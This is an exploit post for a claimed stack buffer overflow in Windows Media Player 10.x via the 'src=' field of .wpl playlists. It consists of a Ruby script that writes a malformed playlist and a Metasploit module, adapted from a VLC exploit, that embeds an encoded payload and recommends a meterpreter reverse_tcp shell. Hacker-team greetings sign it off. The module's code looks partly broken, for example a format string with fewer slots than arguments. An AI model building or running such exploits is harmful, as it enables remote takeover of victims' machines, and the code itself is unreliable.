========================================================================================                  
| # Title    : Windows Media Player 10.x (.wpl) 'src=' Local Stack-Buffer Overflow     |
| # Author   : KedAns-Dz                                                               |
| # email    : Ked-h@hotmail.com                                                       |
| # Home     : HMD/AM (30500/04300) - Algeria -(00213555248701)                        |
| # Web Site : /(~_-)\ ...                                                             |
| # Tested on : windows XP SP3 Français & Arabic                                       |
| # Target SFW : Windows Media Player 10.x or Other Verstions                          |
| # Rank = Excellent Ranking ...                                                       | 
======================      Exploit By KedAns-Dz       =================================
# info : -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_|
# You are can Develop this module on MetaSploit3             |
# and Immixing the exploit 'windows/fileformat/vlc_smb_uri'  |
# and payload ' windows/meterpreter/reverse_tcp ' on this .  |
# note : you are can change 'src=' to 'smb='                 |
#-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_|
----------------------------------
# Ruby File   : 
----------------------------------


#!/usr/bin/ruby

amt = "A" * 100 + "-"
bmt = "B" * 115 + "-"
cmt = "C" * 130
buff = amt + bmt + cmt 

ked = "\x4b\x65\x64\x41\x6e\x73\x5f\x44\x7a" * 50 

wpl = %Q|<?wpl version="1.0"?>
<smil>
    <head>
        <meta name="Generator" content="Microsoft Windows Media Player -- 11.0.5721.5145"/>
        <meta name="AverageRating" content="76"/>
        <meta name="TotalDuration" content="3519"/>
        <meta name="ItemCount" content="17"/>
        <title>KedAns</title>
    </head>
    <body>
        <seq>
		<media src="#{ked}" tid="{#{buff}}"/>
		</seq>
    </body>
</smil>
|
playlist = File.new("ked_wm10.wpl","wb")
playlist.write(wpl)
playlist.close


#================================================================================

----------------------------------
# Ruby File (on MetaSploit3)   : 
----------------------------------
##
# $Id: wmp_src_pls.rb 2011-02-19 02:46 KedAns-Dz $
##
#-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_|
# This module is Developed on 'windows/fileformat/vlc_smb_uri' |
# in Metasploit3 , payload> ' windows/meterpreter/reverse_tcp' |
# note : you are can change 'src=' to 'smb='                   |
#-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_|
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Windows Media Player (src=) Local Stack-Buffer Overflow',
			'Description'    => %q{
			   This module exploits a stack-based buffer overflow in the WMP 10.x
					 This module is Developed on 'windows/fileformat/vlc_smb_uri' 
                     in Metasploit3 , payload> ' windows/meterpreter/reverse_tcp' 
                     note : you are can change 'src=' to 'smb='                   
			},
			'License'        => MSF_LICENSE,
			'Author' 	     => [
			               'KedAns-Dz <Ked-h(at)hotmail(dot)com',
						   ' [D] HaCkerS-StreeT-Team [Z] ',
						        ],
			'Version'        => '0.1',
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'DisableNops'    => true,
					'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ESI',
						}
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Media Player 10.x on Windows XP SP3',
						{
							'Readable' => 0x65414141, 
							'Offset'   => 409,
							'Ret'      => 0x6b54543e,
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 19 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'kedans.wpl']),
			], self.class)
	end

	def exploit

		template = %Q|<?wpl version="1.0"?>
<smil>
    <head>
        <meta name="Generator" content="Microsoft Windows Media Player -- 11.0.5721.5145"/>
        <meta name="AverageRating" content="76"/>
        <meta name="TotalDuration" content="3519"/>
        <meta name="ItemCount" content="17"/>
        <title>KedAns</title>
    </head>
    <body>
        <seq>
		<media REPLACE_ME tid="{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB-CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC}"/>
        </seq>
    </body>
</smil>
|

		readable = [target['Readable']].pack('V')

		psz_remote = rand_text_alphanumeric(target['Offset'] + 4)
		psz_remote[0,2] = "\\\\"
		psz_remote[2+260,1] = "\\"

		psz_remote[263,4] = readable
		psz_remote[271,4] = readable
		psz_remote[325,4] = readable
		psz_remote[337,4] = readable

		psz_remote[target['Offset'],4] = [target.ret].pack('V')

		host,share = psz_remote[2,psz_remote.length].split("\\")
		path = "src='%s@%s'" % [payload.encoded, host, share]
		sploit = template.gsub(/REPLACE_ME/, path)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end



#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================|
#[»] Team :  [D] HaCkerS-StreeT-Team [Z] > Algerians Hackers <                 |
# Greetz : Islampard * Zaki.Eng * Noro FouinY * BadR0 * Dr.Ride * Massinhou-Dz |
# Red1One * Fox-Dz * Hani * XoreR * Mr.Dak007 * TOnyXED * all my friends ..    | 
#------------------------------------------------------------------------------|
